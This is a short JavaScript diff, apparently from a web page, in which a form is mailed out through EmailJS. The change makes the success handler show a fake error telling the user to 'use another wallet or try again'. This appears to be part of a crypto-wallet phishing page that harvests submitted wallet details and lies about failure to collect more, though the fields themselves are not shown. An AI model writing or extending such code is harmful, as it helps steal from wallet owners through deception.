@@ -1634,7 +1634,7 @@ const templateID = 'template_2bfqqw8';
 emailjs.sendForm(serviceID, templateID, this)
 .then(() => {
 btn.value = 'Send Email';
-alert('errorr!');
+alert('An error occurred,use another wallet or try again!!!');
 }, (err) => {
 btn.value = 'Send Email';
 alert(JSON.stringify(err));
